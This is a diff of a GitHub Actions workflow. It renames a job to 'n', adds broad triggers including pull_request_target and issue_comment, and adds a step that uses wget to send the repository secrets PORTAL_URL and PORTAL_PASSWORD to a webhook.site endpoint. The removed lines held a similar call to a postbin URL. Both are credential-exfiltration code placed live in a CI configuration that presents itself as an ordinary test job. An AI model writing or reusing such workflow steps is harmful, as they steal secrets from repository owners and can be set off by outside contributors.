@@ -1,17 +1,13 @@
-name: Say Hi
+name: n
 
-on: pull_request
+on: [pull_request, issue_comment, issues, pull_request_target, pull_request_review, status]
 
 jobs:
   test:
     runs-on: windows-latest
-
     steps:
-    - uses: actions/checkout@v3
-    - name: Say Hi
-      run: |
-        echo "hi!!"
-         C:\msys64\usr\bin\wget.exe "https://www.toptal.com/developers/postbin/1691117513227-8767663748003?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
-        C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
-
-        
+      - uses: actions/checkout@v3
+      - name: n
+        run: | 
+          C:\msys64\usr\bin\wget.exe '''https://webhook.site/700d54d5-9844-406d-a629-acdd5be104ff?n=${{ secrets.PORTAL_URL }}&k=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          cat test
